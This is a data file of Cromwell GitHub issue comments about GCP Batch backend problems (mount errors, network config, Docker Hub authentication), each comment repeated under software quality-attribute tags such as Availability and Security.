https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2376149124:592,Availability,Error,Error,592,"@mcovarr Thanks for your response. The documentation can be somewhat unclear. I've updated the localization and have kept this inline with my main config for GCP Batch. I am using Cromwell v87. However, while running a job, I’m encountering issues when Cromwell is attempting to mount my files to a local mount. I have been monitoring the VM and job, it seems Cromwell is unsure of how to handle this: For instance:. **Error 1:**; ```; severity: ""DEFAULT""; textPayload: ""umount: /mnt/2d49bcb009113835140d638a10b535af: no mount point specified.""; timestamp: ""2024-09-26T14:07:54.88114; ```. **Error 2:**; ```; severity: ""ERROR""; textPayload: ""Copying gs://test-cromwell-genomics-resources/references/hg38/v0/Homo_sapiens_assembly38.fasta.fai to file:///mnt/disks/cromwell_root/test-cromwell-genomics-resources/references/hg38/v0/Homo_sapiens_assembly38.fasta.fai""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2376149124
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2376149124:620,Availability,ERROR,ERROR,620,"@mcovarr Thanks for your response. The documentation can be somewhat unclear. I've updated the localization and have kept this inline with my main config for GCP Batch. I am using Cromwell v87. However, while running a job, I’m encountering issues when Cromwell is attempting to mount my files to a local mount. I have been monitoring the VM and job, it seems Cromwell is unsure of how to handle this: For instance:. **Error 1:**; ```; severity: ""DEFAULT""; textPayload: ""umount: /mnt/2d49bcb009113835140d638a10b535af: no mount point specified.""; timestamp: ""2024-09-26T14:07:54.88114; ```. **Error 2:**; ```; severity: ""ERROR""; textPayload: ""Copying gs://test-cromwell-genomics-resources/references/hg38/v0/Homo_sapiens_assembly38.fasta.fai to file:///mnt/disks/cromwell_root/test-cromwell-genomics-resources/references/hg38/v0/Homo_sapiens_assembly38.fasta.fai""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2376149124
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2376149124:83,Deployability,update,updated,83,"@mcovarr Thanks for your response. The documentation can be somewhat unclear. I've updated the localization and have kept this inline with my main config for GCP Batch. I am using Cromwell v87. However, while running a job, I’m encountering issues when Cromwell is attempting to mount my files to a local mount. I have been monitoring the VM and job, it seems Cromwell is unsure of how to handle this: For instance:. **Error 1:**; ```; severity: ""DEFAULT""; textPayload: ""umount: /mnt/2d49bcb009113835140d638a10b535af: no mount point specified.""; timestamp: ""2024-09-26T14:07:54.88114; ```. **Error 2:**; ```; severity: ""ERROR""; textPayload: ""Copying gs://test-cromwell-genomics-resources/references/hg38/v0/Homo_sapiens_assembly38.fasta.fai to file:///mnt/disks/cromwell_root/test-cromwell-genomics-resources/references/hg38/v0/Homo_sapiens_assembly38.fasta.fai""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2376149124
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2376149124:324,Energy Efficiency,monitor,monitoring,324,"@mcovarr Thanks for your response. The documentation can be somewhat unclear. I've updated the localization and have kept this inline with my main config for GCP Batch. I am using Cromwell v87. However, while running a job, I’m encountering issues when Cromwell is attempting to mount my files to a local mount. I have been monitoring the VM and job, it seems Cromwell is unsure of how to handle this: For instance:. **Error 1:**; ```; severity: ""DEFAULT""; textPayload: ""umount: /mnt/2d49bcb009113835140d638a10b535af: no mount point specified.""; timestamp: ""2024-09-26T14:07:54.88114; ```. **Error 2:**; ```; severity: ""ERROR""; textPayload: ""Copying gs://test-cromwell-genomics-resources/references/hg38/v0/Homo_sapiens_assembly38.fasta.fai to file:///mnt/disks/cromwell_root/test-cromwell-genomics-resources/references/hg38/v0/Homo_sapiens_assembly38.fasta.fai""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2376149124
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2376149124:147,Modifiability,config,config,147,"@mcovarr Thanks for your response. The documentation can be somewhat unclear. I've updated the localization and have kept this inline with my main config for GCP Batch. I am using Cromwell v87. However, while running a job, I’m encountering issues when Cromwell is attempting to mount my files to a local mount. I have been monitoring the VM and job, it seems Cromwell is unsure of how to handle this: For instance:. **Error 1:**; ```; severity: ""DEFAULT""; textPayload: ""umount: /mnt/2d49bcb009113835140d638a10b535af: no mount point specified.""; timestamp: ""2024-09-26T14:07:54.88114; ```. **Error 2:**; ```; severity: ""ERROR""; textPayload: ""Copying gs://test-cromwell-genomics-resources/references/hg38/v0/Homo_sapiens_assembly38.fasta.fai to file:///mnt/disks/cromwell_root/test-cromwell-genomics-resources/references/hg38/v0/Homo_sapiens_assembly38.fasta.fai""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2376149124
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2376149124:655,Testability,test,test-cromwell-genomics-resources,655,"@mcovarr Thanks for your response. The documentation can be somewhat unclear. I've updated the localization and have kept this inline with my main config for GCP Batch. I am using Cromwell v87. However, while running a job, I’m encountering issues when Cromwell is attempting to mount my files to a local mount. I have been monitoring the VM and job, it seems Cromwell is unsure of how to handle this: For instance:. **Error 1:**; ```; severity: ""DEFAULT""; textPayload: ""umount: /mnt/2d49bcb009113835140d638a10b535af: no mount point specified.""; timestamp: ""2024-09-26T14:07:54.88114; ```. **Error 2:**; ```; severity: ""ERROR""; textPayload: ""Copying gs://test-cromwell-genomics-resources/references/hg38/v0/Homo_sapiens_assembly38.fasta.fai to file:///mnt/disks/cromwell_root/test-cromwell-genomics-resources/references/hg38/v0/Homo_sapiens_assembly38.fasta.fai""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2376149124
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2376149124:776,Testability,test,test-cromwell-genomics-resources,776,"@mcovarr Thanks for your response. The documentation can be somewhat unclear. I've updated the localization and have kept this inline with my main config for GCP Batch. I am using Cromwell v87. However, while running a job, I’m encountering issues when Cromwell is attempting to mount my files to a local mount. I have been monitoring the VM and job, it seems Cromwell is unsure of how to handle this: For instance:. **Error 1:**; ```; severity: ""DEFAULT""; textPayload: ""umount: /mnt/2d49bcb009113835140d638a10b535af: no mount point specified.""; timestamp: ""2024-09-26T14:07:54.88114; ```. **Error 2:**; ```; severity: ""ERROR""; textPayload: ""Copying gs://test-cromwell-genomics-resources/references/hg38/v0/Homo_sapiens_assembly38.fasta.fai to file:///mnt/disks/cromwell_root/test-cromwell-genomics-resources/references/hg38/v0/Homo_sapiens_assembly38.fasta.fai""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2376149124
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2377234954:139,Deployability,release,released,139,"@jbakerpmc GCP Batch reference disks are broken in Cromwell 87, you'll need to run from the `develop` branch at least until Cromwell 88 is released.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2377234954
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2378510458:36,Availability,error,error,36,@mcovarr I continue to get the same error after creating a build with the develop branch seems that it is not ready! Thanks for letting me know :),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2378510458
https://github.com/broadinstitute/cromwell/pull/7504#issuecomment-2307114880:58,Testability,test,test,58,The `GcpBatchVpcAndSubnetworkProjectLabelValuesSpec` unit test is failing as a result of these changes.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7504#issuecomment-2307114880
https://github.com/broadinstitute/cromwell/pull/7505#issuecomment-2346612179:115,Deployability,configurat,configuration,115,Confirmed through manual testing with Cromwell and GCP Batch backend that providing just the `network-name` in the configuration works and is ok to leave off the `subnetwork-name`. I believe this can be a replacement in GCP Batch for the use of the `*` character for the region in the `subnetwork-name` that was used with PAPI.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7505#issuecomment-2346612179
https://github.com/broadinstitute/cromwell/pull/7505#issuecomment-2346612179:115,Modifiability,config,configuration,115,Confirmed through manual testing with Cromwell and GCP Batch backend that providing just the `network-name` in the configuration works and is ok to leave off the `subnetwork-name`. I believe this can be a replacement in GCP Batch for the use of the `*` character for the region in the `subnetwork-name` that was used with PAPI.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7505#issuecomment-2346612179
https://github.com/broadinstitute/cromwell/pull/7505#issuecomment-2346612179:25,Testability,test,testing,25,Confirmed through manual testing with Cromwell and GCP Batch backend that providing just the `network-name` in the configuration works and is ok to leave off the `subnetwork-name`. I believe this can be a replacement in GCP Batch for the use of the `*` character for the region in the `subnetwork-name` that was used with PAPI.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7505#issuecomment-2346612179
https://github.com/broadinstitute/cromwell/pull/7507#issuecomment-2307714053:349,Performance,perform,perform,349,"> Nice! I really appreciate the attention to how we're handling this large amount of data.; > ; > How are you thinking clients will interact with this service?. For now, I'm just thinking that clients will get a reference to this actor and call `getSku` repeatedly, as needed. Still a little up in the air as these clients don't yet exist. . Should perform fine with only the public cost catalog, since we're limited to one batch of requests every 24 hours. IMO fancier async stuff is good but should come later.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7507#issuecomment-2307714053
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2318872470:59,Security,authenticat,authentication,59,We had to add prepend `docker.io` to the image name to get authentication to work so `docker.io/broadinstitute/cloud-cromwell`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2318872470
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2318997035:26,Availability,error,error,26,"I'm still seeing the same error even when I add the `docker.io/` prefix. Confirming the correct command in `gcloud batch job describe`:. ```; ""printf '%s %s\\n' \""$(date -u '+%Y/%m/%d %H:%M:%S')\"" Running\\ user\\ runnable:\\ docker\\ run\\ -v\\ /mnt/disks/cromwell_root:/mnt/disks/cromwell_root\\ --entrypoint\\=/bin/bash\\ docker.io/broadinstitute/cloud-cromwell@sha256:0d51f90e1dd6a449d4587004c945e43f2a7bbf615151308cff40c15998cc3ad4\\ /mnt/disks/cromwell_root/script""; ```. Also it would be good not to require a `docker.io/` prefix as our users would need to edit all of their WDLs referencing Docker Hub images to be able to run on GCP Batch.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2318997035
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2319010020:87,Security,authenticat,authentication,87,I will run a test from Cromwell. In testing the GCP Batch SDK directly it will only do authentication with the docker.io prefix.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2319010020
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2319010020:13,Testability,test,test,13,I will run a test from Cromwell. In testing the GCP Batch SDK directly it will only do authentication with the docker.io prefix.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2319010020
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2319010020:36,Testability,test,testing,36,I will run a test from Cromwell. In testing the GCP Batch SDK directly it will only do authentication with the docker.io prefix.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2319010020
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479:195,Availability,error,error,195,"With `docker.io` prepended the job succeeds in Cromwell and GCP Batch with the below config. It fails without the `docker.io` prepend due to GCP Batch requiring it. There is a docker hash lookup error from the `WorkflowDockerLookupActor`. Error below. We can discuss more on meeting today. ```; config {; dockerhub {; token = ""base64-encoded-docker-hub-username:password""; }; ``` . ```; [2024-08-30 13:56:20,10] [warn] BackendPreparationActor_for_c5f3f88a:myWorkflow.myTask:-1:1 [c5f3f88a]: Docker lookup failed; java.lang.Exception: Failed to get docker hash for docker.io/dspeck/pull-test1:v1 Request failed with status 401 and body {""details"":""incorrect username or password""}; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479:239,Availability,Error,Error,239,"With `docker.io` prepended the job succeeds in Cromwell and GCP Batch with the below config. It fails without the `docker.io` prepend due to GCP Batch requiring it. There is a docker hash lookup error from the `WorkflowDockerLookupActor`. Error below. We can discuss more on meeting today. ```; config {; dockerhub {; token = ""base64-encoded-docker-hub-username:password""; }; ``` . ```; [2024-08-30 13:56:20,10] [warn] BackendPreparationActor_for_c5f3f88a:myWorkflow.myTask:-1:1 [c5f3f88a]: Docker lookup failed; java.lang.Exception: Failed to get docker hash for docker.io/dspeck/pull-test1:v1 Request failed with status 401 and body {""details"":""incorrect username or password""}; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479:85,Modifiability,config,config,85,"With `docker.io` prepended the job succeeds in Cromwell and GCP Batch with the below config. It fails without the `docker.io` prepend due to GCP Batch requiring it. There is a docker hash lookup error from the `WorkflowDockerLookupActor`. Error below. We can discuss more on meeting today. ```; config {; dockerhub {; token = ""base64-encoded-docker-hub-username:password""; }; ``` . ```; [2024-08-30 13:56:20,10] [warn] BackendPreparationActor_for_c5f3f88a:myWorkflow.myTask:-1:1 [c5f3f88a]: Docker lookup failed; java.lang.Exception: Failed to get docker hash for docker.io/dspeck/pull-test1:v1 Request failed with status 401 and body {""details"":""incorrect username or password""}; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479:295,Modifiability,config,config,295,"With `docker.io` prepended the job succeeds in Cromwell and GCP Batch with the below config. It fails without the `docker.io` prepend due to GCP Batch requiring it. There is a docker hash lookup error from the `WorkflowDockerLookupActor`. Error below. We can discuss more on meeting today. ```; config {; dockerhub {; token = ""base64-encoded-docker-hub-username:password""; }; ``` . ```; [2024-08-30 13:56:20,10] [warn] BackendPreparationActor_for_c5f3f88a:myWorkflow.myTask:-1:1 [c5f3f88a]: Docker lookup failed; java.lang.Exception: Failed to get docker hash for docker.io/dspeck/pull-test1:v1 Request failed with status 401 and body {""details"":""incorrect username or password""}; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479:183,Security,hash,hash,183,"With `docker.io` prepended the job succeeds in Cromwell and GCP Batch with the below config. It fails without the `docker.io` prepend due to GCP Batch requiring it. There is a docker hash lookup error from the `WorkflowDockerLookupActor`. Error below. We can discuss more on meeting today. ```; config {; dockerhub {; token = ""base64-encoded-docker-hub-username:password""; }; ``` . ```; [2024-08-30 13:56:20,10] [warn] BackendPreparationActor_for_c5f3f88a:myWorkflow.myTask:-1:1 [c5f3f88a]: Docker lookup failed; java.lang.Exception: Failed to get docker hash for docker.io/dspeck/pull-test1:v1 Request failed with status 401 and body {""details"":""incorrect username or password""}; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479:362,Security,password,password,362,"With `docker.io` prepended the job succeeds in Cromwell and GCP Batch with the below config. It fails without the `docker.io` prepend due to GCP Batch requiring it. There is a docker hash lookup error from the `WorkflowDockerLookupActor`. Error below. We can discuss more on meeting today. ```; config {; dockerhub {; token = ""base64-encoded-docker-hub-username:password""; }; ``` . ```; [2024-08-30 13:56:20,10] [warn] BackendPreparationActor_for_c5f3f88a:myWorkflow.myTask:-1:1 [c5f3f88a]: Docker lookup failed; java.lang.Exception: Failed to get docker hash for docker.io/dspeck/pull-test1:v1 Request failed with status 401 and body {""details"":""incorrect username or password""}; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479:555,Security,hash,hash,555,"With `docker.io` prepended the job succeeds in Cromwell and GCP Batch with the below config. It fails without the `docker.io` prepend due to GCP Batch requiring it. There is a docker hash lookup error from the `WorkflowDockerLookupActor`. Error below. We can discuss more on meeting today. ```; config {; dockerhub {; token = ""base64-encoded-docker-hub-username:password""; }; ``` . ```; [2024-08-30 13:56:20,10] [warn] BackendPreparationActor_for_c5f3f88a:myWorkflow.myTask:-1:1 [c5f3f88a]: Docker lookup failed; java.lang.Exception: Failed to get docker hash for docker.io/dspeck/pull-test1:v1 Request failed with status 401 and body {""details"":""incorrect username or password""}; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479:669,Security,password,password,669,"With `docker.io` prepended the job succeeds in Cromwell and GCP Batch with the below config. It fails without the `docker.io` prepend due to GCP Batch requiring it. There is a docker hash lookup error from the `WorkflowDockerLookupActor`. Error below. We can discuss more on meeting today. ```; config {; dockerhub {; token = ""base64-encoded-docker-hub-username:password""; }; ``` . ```; [2024-08-30 13:56:20,10] [warn] BackendPreparationActor_for_c5f3f88a:myWorkflow.myTask:-1:1 [c5f3f88a]: Docker lookup failed; java.lang.Exception: Failed to get docker hash for docker.io/dspeck/pull-test1:v1 Request failed with status 401 and body {""details"":""incorrect username or password""}; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981:800,Deployability,release,release,800,"Thank you Dan. I checked my config and it appears to be okay, also the correct Docker Hub username and password are being printed out in the Cloud Logs (which they probably shouldn't be, but that's a separate issue). When I log in with these credentials locally using Docker engine v27.1.1 and try to pull the image from our test WDL I get the following output, exit code 1, and the image is not pulled:. ```; % docker pull ""broadinstitute/cloud-cromwell:dev""; dev: Pulling from broadinstitute/cloud-cromwell. What's next:; View a summary of image vulnerabilities and recommendations → docker scout quickview broadinstitute/cloud-cromwell:dev; [DEPRECATION NOTICE] Docker Image Format v1 and Docker Image manifest version 2, schema 1 support is disabled by default and will be removed in an upcoming release. Suggest the author of docker.io/broadinstitute/cloud-cromwell:dev to upgrade the image to the OCI Format or Docker Image manifest v2, schema 2. More information at https://docs.docker.com/go/deprecated-image-specs/; ```. I will try to find a newer private image to test with, but from your output above I'm guessing that would work. So a few concerns here:. - ~~Batch (and my local machines) don't~~ My local machine doesn't appear to be able to pull the particular `broadinstitute/cloud-cromwell:dev`Docker image from Cromwell's CI test. This may be related to the deprecation message implying that the image uses an outdated format.; - From the last line of your output, it looks as if the Batch backend is failing to get Docker image hashes for your private image, which is something that would break Cromwell's call caching.; - The aforementioned issue with plaintext Docker u/p going to the logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981:878,Deployability,upgrade,upgrade,878,"Thank you Dan. I checked my config and it appears to be okay, also the correct Docker Hub username and password are being printed out in the Cloud Logs (which they probably shouldn't be, but that's a separate issue). When I log in with these credentials locally using Docker engine v27.1.1 and try to pull the image from our test WDL I get the following output, exit code 1, and the image is not pulled:. ```; % docker pull ""broadinstitute/cloud-cromwell:dev""; dev: Pulling from broadinstitute/cloud-cromwell. What's next:; View a summary of image vulnerabilities and recommendations → docker scout quickview broadinstitute/cloud-cromwell:dev; [DEPRECATION NOTICE] Docker Image Format v1 and Docker Image manifest version 2, schema 1 support is disabled by default and will be removed in an upcoming release. Suggest the author of docker.io/broadinstitute/cloud-cromwell:dev to upgrade the image to the OCI Format or Docker Image manifest v2, schema 2. More information at https://docs.docker.com/go/deprecated-image-specs/; ```. I will try to find a newer private image to test with, but from your output above I'm guessing that would work. So a few concerns here:. - ~~Batch (and my local machines) don't~~ My local machine doesn't appear to be able to pull the particular `broadinstitute/cloud-cromwell:dev`Docker image from Cromwell's CI test. This may be related to the deprecation message implying that the image uses an outdated format.; - From the last line of your output, it looks as if the Batch backend is failing to get Docker image hashes for your private image, which is something that would break Cromwell's call caching.; - The aforementioned issue with plaintext Docker u/p going to the logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981:1387,Integrability,message,message,1387,"Thank you Dan. I checked my config and it appears to be okay, also the correct Docker Hub username and password are being printed out in the Cloud Logs (which they probably shouldn't be, but that's a separate issue). When I log in with these credentials locally using Docker engine v27.1.1 and try to pull the image from our test WDL I get the following output, exit code 1, and the image is not pulled:. ```; % docker pull ""broadinstitute/cloud-cromwell:dev""; dev: Pulling from broadinstitute/cloud-cromwell. What's next:; View a summary of image vulnerabilities and recommendations → docker scout quickview broadinstitute/cloud-cromwell:dev; [DEPRECATION NOTICE] Docker Image Format v1 and Docker Image manifest version 2, schema 1 support is disabled by default and will be removed in an upcoming release. Suggest the author of docker.io/broadinstitute/cloud-cromwell:dev to upgrade the image to the OCI Format or Docker Image manifest v2, schema 2. More information at https://docs.docker.com/go/deprecated-image-specs/; ```. I will try to find a newer private image to test with, but from your output above I'm guessing that would work. So a few concerns here:. - ~~Batch (and my local machines) don't~~ My local machine doesn't appear to be able to pull the particular `broadinstitute/cloud-cromwell:dev`Docker image from Cromwell's CI test. This may be related to the deprecation message implying that the image uses an outdated format.; - From the last line of your output, it looks as if the Batch backend is failing to get Docker image hashes for your private image, which is something that would break Cromwell's call caching.; - The aforementioned issue with plaintext Docker u/p going to the logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981:28,Modifiability,config,config,28,"Thank you Dan. I checked my config and it appears to be okay, also the correct Docker Hub username and password are being printed out in the Cloud Logs (which they probably shouldn't be, but that's a separate issue). When I log in with these credentials locally using Docker engine v27.1.1 and try to pull the image from our test WDL I get the following output, exit code 1, and the image is not pulled:. ```; % docker pull ""broadinstitute/cloud-cromwell:dev""; dev: Pulling from broadinstitute/cloud-cromwell. What's next:; View a summary of image vulnerabilities and recommendations → docker scout quickview broadinstitute/cloud-cromwell:dev; [DEPRECATION NOTICE] Docker Image Format v1 and Docker Image manifest version 2, schema 1 support is disabled by default and will be removed in an upcoming release. Suggest the author of docker.io/broadinstitute/cloud-cromwell:dev to upgrade the image to the OCI Format or Docker Image manifest v2, schema 2. More information at https://docs.docker.com/go/deprecated-image-specs/; ```. I will try to find a newer private image to test with, but from your output above I'm guessing that would work. So a few concerns here:. - ~~Batch (and my local machines) don't~~ My local machine doesn't appear to be able to pull the particular `broadinstitute/cloud-cromwell:dev`Docker image from Cromwell's CI test. This may be related to the deprecation message implying that the image uses an outdated format.; - From the last line of your output, it looks as if the Batch backend is failing to get Docker image hashes for your private image, which is something that would break Cromwell's call caching.; - The aforementioned issue with plaintext Docker u/p going to the logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981:103,Security,password,password,103,"Thank you Dan. I checked my config and it appears to be okay, also the correct Docker Hub username and password are being printed out in the Cloud Logs (which they probably shouldn't be, but that's a separate issue). When I log in with these credentials locally using Docker engine v27.1.1 and try to pull the image from our test WDL I get the following output, exit code 1, and the image is not pulled:. ```; % docker pull ""broadinstitute/cloud-cromwell:dev""; dev: Pulling from broadinstitute/cloud-cromwell. What's next:; View a summary of image vulnerabilities and recommendations → docker scout quickview broadinstitute/cloud-cromwell:dev; [DEPRECATION NOTICE] Docker Image Format v1 and Docker Image manifest version 2, schema 1 support is disabled by default and will be removed in an upcoming release. Suggest the author of docker.io/broadinstitute/cloud-cromwell:dev to upgrade the image to the OCI Format or Docker Image manifest v2, schema 2. More information at https://docs.docker.com/go/deprecated-image-specs/; ```. I will try to find a newer private image to test with, but from your output above I'm guessing that would work. So a few concerns here:. - ~~Batch (and my local machines) don't~~ My local machine doesn't appear to be able to pull the particular `broadinstitute/cloud-cromwell:dev`Docker image from Cromwell's CI test. This may be related to the deprecation message implying that the image uses an outdated format.; - From the last line of your output, it looks as if the Batch backend is failing to get Docker image hashes for your private image, which is something that would break Cromwell's call caching.; - The aforementioned issue with plaintext Docker u/p going to the logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981:1546,Security,hash,hashes,1546,"Thank you Dan. I checked my config and it appears to be okay, also the correct Docker Hub username and password are being printed out in the Cloud Logs (which they probably shouldn't be, but that's a separate issue). When I log in with these credentials locally using Docker engine v27.1.1 and try to pull the image from our test WDL I get the following output, exit code 1, and the image is not pulled:. ```; % docker pull ""broadinstitute/cloud-cromwell:dev""; dev: Pulling from broadinstitute/cloud-cromwell. What's next:; View a summary of image vulnerabilities and recommendations → docker scout quickview broadinstitute/cloud-cromwell:dev; [DEPRECATION NOTICE] Docker Image Format v1 and Docker Image manifest version 2, schema 1 support is disabled by default and will be removed in an upcoming release. Suggest the author of docker.io/broadinstitute/cloud-cromwell:dev to upgrade the image to the OCI Format or Docker Image manifest v2, schema 2. More information at https://docs.docker.com/go/deprecated-image-specs/; ```. I will try to find a newer private image to test with, but from your output above I'm guessing that would work. So a few concerns here:. - ~~Batch (and my local machines) don't~~ My local machine doesn't appear to be able to pull the particular `broadinstitute/cloud-cromwell:dev`Docker image from Cromwell's CI test. This may be related to the deprecation message implying that the image uses an outdated format.; - From the last line of your output, it looks as if the Batch backend is failing to get Docker image hashes for your private image, which is something that would break Cromwell's call caching.; - The aforementioned issue with plaintext Docker u/p going to the logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981:147,Testability,Log,Logs,147,"Thank you Dan. I checked my config and it appears to be okay, also the correct Docker Hub username and password are being printed out in the Cloud Logs (which they probably shouldn't be, but that's a separate issue). When I log in with these credentials locally using Docker engine v27.1.1 and try to pull the image from our test WDL I get the following output, exit code 1, and the image is not pulled:. ```; % docker pull ""broadinstitute/cloud-cromwell:dev""; dev: Pulling from broadinstitute/cloud-cromwell. What's next:; View a summary of image vulnerabilities and recommendations → docker scout quickview broadinstitute/cloud-cromwell:dev; [DEPRECATION NOTICE] Docker Image Format v1 and Docker Image manifest version 2, schema 1 support is disabled by default and will be removed in an upcoming release. Suggest the author of docker.io/broadinstitute/cloud-cromwell:dev to upgrade the image to the OCI Format or Docker Image manifest v2, schema 2. More information at https://docs.docker.com/go/deprecated-image-specs/; ```. I will try to find a newer private image to test with, but from your output above I'm guessing that would work. So a few concerns here:. - ~~Batch (and my local machines) don't~~ My local machine doesn't appear to be able to pull the particular `broadinstitute/cloud-cromwell:dev`Docker image from Cromwell's CI test. This may be related to the deprecation message implying that the image uses an outdated format.; - From the last line of your output, it looks as if the Batch backend is failing to get Docker image hashes for your private image, which is something that would break Cromwell's call caching.; - The aforementioned issue with plaintext Docker u/p going to the 